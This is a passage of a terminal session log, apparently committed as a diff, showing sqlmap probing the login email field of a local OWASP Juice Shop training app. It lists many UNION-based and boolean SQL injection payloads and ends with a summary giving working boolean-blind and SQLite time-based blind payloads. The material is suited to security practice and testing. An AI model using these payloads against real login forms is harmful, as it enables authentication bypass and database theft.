+[16:43:25] [PAYLOAD] admin@juice-sh.op' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- HjJU
+[16:43:25] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[16:43:25] [PAYLOAD] admin@juice-sh.op' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- KeVj
+[16:43:25] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[16:43:25] [PAYLOAD] admin@juice-sh.op' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- mfiz
+[16:43:25] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[16:43:25] [PAYLOAD] admin@juice-sh.op' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- GWUw
+[16:43:25] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[16:43:25] [PAYLOAD] admin@juice-sh.op' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- myYf
+[16:43:25] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[16:43:25] [PAYLOAD] admin@juice-sh.op' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- CPiy
+[16:43:25] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[16:43:25] [PAYLOAD] admin@juice-sh.op' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- aMbo
+[16:43:25] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[16:43:25] [INFO] testing 'Generic UNION query (random number) - 21 to 40 columns'
+[16:43:25] [PAYLOAD] -8558' UNION ALL SELECT 2953,2953,2953,2953,2953,2953,2953,2953,2953,2953,2953,2953,2953,2953,2953,2953,2953,2953,2953,2953,2953-- vlXU
+[16:43:25] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[16:43:25] [PAYLOAD] -6115' UNION ALL SELECT 8998,8998,8998,8998,8998,8998,8998,8998,8998,8998,8998,8998,8998,8998,8998,8998,8998,8998,8998,8998,8998,8998-- zmZY
+[16:43:25] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[16:43:25] [PAYLOAD] -4261' UNION ALL SELECT 8412,8412,8412,8412,8412,8412,8412,8412,8412,8412,8412,8412,8412,8412,8412,8412,8412,8412,8412,8412,8412,8412,8412-- nvBg
+[16:43:25] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[16:43:25] [PAYLOAD] -5077' UNION ALL SELECT 8236,8236,8236,8236,8236,8236,8236,8236,8236,8236,8236,8236,8236,8236,8236,8236,8236,8236,8236,8236,8236,8236,8236,8236-- sRKP
+[16:43:26] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[16:43:26] [PAYLOAD] -6752' UNION ALL SELECT 2868,2868,2868,2868,2868,2868,2868,2868,2868,2868,2868,2868,2868,2868,2868,2868,2868,2868,2868,2868,2868,2868,2868,2868,2868-- hobi
+[16:43:26] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[16:43:26] [PAYLOAD] -6834' UNION ALL SELECT 7127,7127,7127,7127,7127,7127,7127,7127,7127,7127,7127,7127,7127,7127,7127,7127,7127,7127,7127,7127,7127,7127,7127,7127,7127,7127-- gZjE
+[16:43:26] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[16:43:26] [PAYLOAD] -6078' UNION ALL SELECT 3496,3496,3496,3496,3496,3496,3496,3496,3496,3496,3496,3496,3496,3496,3496,3496,3496,3496,3496,3496,3496,3496,3496,3496,3496,3496,3496-- RCyl
+[16:43:26] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[16:43:26] [PAYLOAD] -4191' UNION ALL SELECT 1988,1988,1988,1988,1988,1988,1988,1988,1988,1988,1988,1988,1988,1988,1988,1988,1988,1988,1988,1988,1988,1988,1988,1988,1988,1988,1988,1988-- gKPm
+[16:43:26] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[16:43:26] [PAYLOAD] -9703' UNION ALL SELECT 6237,6237,6237,6237,6237,6237,6237,6237,6237,6237,6237,6237,6237,6237,6237,6237,6237,6237,6237,6237,6237,6237,6237,6237,6237,6237,6237,6237,6237-- cEhP
+[16:43:26] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[16:43:26] [PAYLOAD] -3463' UNION ALL SELECT 4700,4700,4700,4700,4700,4700,4700,4700,4700,4700,4700,4700,4700,4700,4700,4700,4700,4700,4700,4700,4700,4700,4700,4700,4700,4700,4700,4700,4700,4700-- xHAw
+[16:43:26] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[16:43:26] [PAYLOAD] -6930' UNION ALL SELECT 2492,2492,2492,2492,2492,2492,2492,2492,2492,2492,2492,2492,2492,2492,2492,2492,2492,2492,2492,2492,2492,2492,2492,2492,2492,2492,2492,2492,2492,2492,2492-- AaGy
+[16:43:26] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[16:43:26] [PAYLOAD] -3960' UNION ALL SELECT 4591,4591,4591,4591,4591,4591,4591,4591,4591,4591,4591,4591,4591,4591,4591,4591,4591,4591,4591,4591,4591,4591,4591,4591,4591,4591,4591,4591,4591,4591,4591,4591-- zMvH
+[16:43:26] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[16:43:26] [PAYLOAD] -4311' UNION ALL SELECT 7236,7236,7236,7236,7236,7236,7236,7236,7236,7236,7236,7236,7236,7236,7236,7236,7236,7236,7236,7236,7236,7236,7236,7236,7236,7236,7236,7236,7236,7236,7236,7236,7236-- ZWis
+[16:43:26] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[16:43:26] [PAYLOAD] -4025' UNION ALL SELECT 7062,7062,7062,7062,7062,7062,7062,7062,7062,7062,7062,7062,7062,7062,7062,7062,7062,7062,7062,7062,7062,7062,7062,7062,7062,7062,7062,7062,7062,7062,7062,7062,7062,7062-- ycwz
+[16:43:26] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[16:43:26] [PAYLOAD] -4288' UNION ALL SELECT 3951,3951,3951,3951,3951,3951,3951,3951,3951,3951,3951,3951,3951,3951,3951,3951,3951,3951,3951,3951,3951,3951,3951,3951,3951,3951,3951,3951,3951,3951,3951,3951,3951,3951,3951-- Jtuc
+[16:43:26] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[16:43:26] [PAYLOAD] -1562' UNION ALL SELECT 9009,9009,9009,9009,9009,9009,9009,9009,9009,9009,9009,9009,9009,9009,9009,9009,9009,9009,9009,9009,9009,9009,9009,9009,9009,9009,9009,9009,9009,9009,9009,9009,9009,9009,9009,9009-- NahG
+[16:43:26] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[16:43:26] [PAYLOAD] -5939' UNION ALL SELECT 9552,9552,9552,9552,9552,9552,9552,9552,9552,9552,9552,9552,9552,9552,9552,9552,9552,9552,9552,9552,9552,9552,9552,9552,9552,9552,9552,9552,9552,9552,9552,9552,9552,9552,9552,9552,9552-- TYxn
+[16:43:26] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[16:43:26] [PAYLOAD] -4042' UNION ALL SELECT 4239,4239,4239,4239,4239,4239,4239,4239,4239,4239,4239,4239,4239,4239,4239,4239,4239,4239,4239,4239,4239,4239,4239,4239,4239,4239,4239,4239,4239,4239,4239,4239,4239,4239,4239,4239,4239,4239-- ekDb
+[16:43:26] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[16:43:26] [PAYLOAD] -9946' UNION ALL SELECT 8052,8052,8052,8052,8052,8052,8052,8052,8052,8052,8052,8052,8052,8052,8052,8052,8052,8052,8052,8052,8052,8052,8052,8052,8052,8052,8052,8052,8052,8052,8052,8052,8052,8052,8052,8052,8052,8052,8052-- sxEc
+[16:43:26] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[16:43:26] [PAYLOAD] -9904' UNION ALL SELECT 7042,7042,7042,7042,7042,7042,7042,7042,7042,7042,7042,7042,7042,7042,7042,7042,7042,7042,7042,7042,7042,7042,7042,7042,7042,7042,7042,7042,7042,7042,7042,7042,7042,7042,7042,7042,7042,7042,7042,7042-- MYZq
+[16:43:26] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[16:43:26] [INFO] testing 'Generic UNION query (NULL) - 41 to 60 columns'
+[16:43:26] [PAYLOAD] admin@juice-sh.op' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- mtru
+[16:43:26] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[16:43:26] [PAYLOAD] admin@juice-sh.op' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- Lscp
+[16:43:26] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[16:43:26] [PAYLOAD] admin@juice-sh.op' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- Wibe
+[16:43:26] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[16:43:26] [PAYLOAD] admin@juice-sh.op' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- mNrl
+[16:43:26] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[16:43:26] [PAYLOAD] admin@juice-sh.op' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ysDy
+[16:43:26] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[16:43:26] [PAYLOAD] admin@juice-sh.op' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- EGTF
+[16:43:26] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[16:43:26] [PAYLOAD] admin@juice-sh.op' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- Ryhi
+[16:43:26] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[16:43:26] [PAYLOAD] admin@juice-sh.op' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ZYHO
+[16:43:26] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[16:43:26] [PAYLOAD] admin@juice-sh.op' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- VRmr
+[16:43:26] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[16:43:26] [PAYLOAD] admin@juice-sh.op' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- qhAl
+[16:43:26] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[16:43:26] [PAYLOAD] admin@juice-sh.op' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- udyI
+[16:43:26] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[16:43:26] [PAYLOAD] admin@juice-sh.op' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- tfTd
+[16:43:26] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[16:43:26] [PAYLOAD] admin@juice-sh.op' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ZpQT
+[16:43:26] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[16:43:26] [PAYLOAD] admin@juice-sh.op' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- rizh
+[16:43:26] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[16:43:26] [PAYLOAD] admin@juice-sh.op' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- bHxv
+[16:43:26] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[16:43:26] [PAYLOAD] admin@juice-sh.op' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- mpWh
+[16:43:26] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[16:43:26] [PAYLOAD] admin@juice-sh.op' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- hPvR
+[16:43:26] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[16:43:26] [PAYLOAD] admin@juice-sh.op' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- PFpn
+[16:43:26] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[16:43:26] [PAYLOAD] admin@juice-sh.op' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- IDWa
+[16:43:26] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[16:43:26] [PAYLOAD] admin@juice-sh.op' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- FoSl
+[16:43:26] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[16:43:26] [DEBUG] skipping test 'Generic UNION query (random number) - 41 to 60 columns' because the level (4) is higher than the provided (3)
+[16:43:26] [DEBUG] skipping test 'Generic UNION query (NULL) - 61 to 80 columns' because the level (4) is higher than the provided (3)
+[16:43:26] [DEBUG] skipping test 'Generic UNION query (random number) - 61 to 80 columns' because the level (5) is higher than the provided (3)
+[16:43:26] [DEBUG] skipping test 'Generic UNION query (NULL) - 81 to 100 columns' because the level (5) is higher than the provided (3)
+[16:43:26] [DEBUG] skipping test 'Generic UNION query (random number) - 81 to 100 columns' because the level (5) is higher than the provided (3)
+[16:43:26] [DEBUG] skipping test 'MySQL UNION query (NULL) - 1 to 20 columns' because its declared DBMS is different than provided
+[16:43:26] [DEBUG] skipping test 'MySQL UNION query (random number) - 1 to 20 columns' because its declared DBMS is different than provided
+[16:43:26] [DEBUG] skipping test 'MySQL UNION query (NULL) - 21 to 40 columns' because its declared DBMS is different than provided
+[16:43:26] [DEBUG] skipping test 'MySQL UNION query (random number) - 21 to 40 columns' because its declared DBMS is different than provided
+[16:43:26] [DEBUG] skipping test 'MySQL UNION query (NULL) - 41 to 60 columns' because its declared DBMS is different than provided
+[16:43:26] [DEBUG] skipping test 'MySQL UNION query (random number) - 41 to 60 columns' because its declared DBMS is different than provided
+[16:43:26] [DEBUG] skipping test 'MySQL UNION query (NULL) - 61 to 80 columns' because its declared DBMS is different than provided
+[16:43:26] [DEBUG] skipping test 'MySQL UNION query (random number) - 61 to 80 columns' because its declared DBMS is different than provided
+[16:43:26] [DEBUG] skipping test 'MySQL UNION query (NULL) - 81 to 100 columns' because its declared DBMS is different than provided
+[16:43:26] [DEBUG] skipping test 'MySQL UNION query (random number) - 81 to 100 columns' because its declared DBMS is different than provided
+[16:43:26] [INFO] checking if the injection point on (custom) POST parameter 'JSON #1*' is a false positive
+[16:43:26] [PAYLOAD] admin@juice-sh.op' AND 52=52-- LINA
+[16:43:26] [PAYLOAD] admin@juice-sh.op' AND 52=80-- iMTg
+[16:43:26] [PAYLOAD] admin@juice-sh.op' AND 80=78-- gCGf
+[16:43:26] [PAYLOAD] admin@juice-sh.op' AND 78=78-- bMDs
+[16:43:26] [PAYLOAD] admin@juice-sh.op' AND 80 78-- eHdv
+[16:43:26] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[16:43:26] [PAYLOAD] admin@juice-sh.op' AND 23=23-- zfpU
+[16:43:26] [PAYLOAD] admin@juice-sh.op' AND 23=92-- wLLP
+[16:43:26] [PAYLOAD] admin@juice-sh.op' AND 92=66-- UpFv
+[16:43:26] [PAYLOAD] admin@juice-sh.op' AND 66=66-- OOiE
+[16:43:26] [PAYLOAD] admin@juice-sh.op' AND 92 66-- cBuP
+[16:43:26] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[16:43:26] [PAYLOAD] admin@juice-sh.op' AND 11=11-- pMxH
+[16:43:26] [PAYLOAD] admin@juice-sh.op' AND 11=43-- GlHa
+[16:43:26] [PAYLOAD] admin@juice-sh.op' AND 43=37-- aCQf
+[16:43:26] [PAYLOAD] admin@juice-sh.op' AND 37=37-- pDaR
+[16:43:26] [PAYLOAD] admin@juice-sh.op' AND 43 37-- IkLW
+[16:43:26] [DEBUG] got HTTP error code: 500 ('Internal Server Error')
+[16:43:26] [DEBUG] checking for filtered characters
+[16:43:26] [PAYLOAD] admin@juice-sh.op' AND 6827>6826-- PRsf
+(custom) POST parameter 'JSON #1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+[16:43:26] [DEBUG] used the default behavior, running in batch mode
+sqlmap identified the following injection point(s) with a total of 151 HTTP(s) requests:
+---
+Parameter: JSON #1* ((custom) POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: {"email": "admin@juice-sh.op' AND 6781=6781-- BKWi", "password": "admin123"}
+    Vector: AND [INFERENCE]
+
+    Type: time-based blind
+    Title: SQLite > 2.0 AND time-based blind (heavy query)
+    Payload: {"email": "admin@juice-sh.op' AND 1737=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2))))-- zdpe", "password": "admin123"}
+    Vector: AND [RANDNUM]=(CASE WHEN ([INFERENCE]) THEN (LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))) ELSE [RANDNUM] END)
+---
+[16:43:26] [INFO] the back-end DBMS is SQLite
+back-end DBMS: SQLite
+[16:43:26] [WARNING] HTTP error codes detected during run:
+401 (Unauthorized) - 18 times, 500 (Internal Server Error) - 105 times
+[16:43:26] [DEBUG] too many 4xx and/or 5xx HTTP error codes could mean that some kind of protection is involved (e.g. WAF)
+[16:43:26] [INFO] fetched data logged to text files under '/home/yernur/.local/share/sqlmap/output/localhost'
+
+[*] ending @ 16:43:26 /2026-04-25/
+
+0;yernur@yernur-VMware-Virtual-Platform: ~/Qwen3based
+yernur@yernur-VMware-Virtual-Platform:~/Qwen3based$ exit
+exit
+
+Script done on 2026-04-25 16:43:47+05:00 [COMMAND_EXIT_CODE="0"]
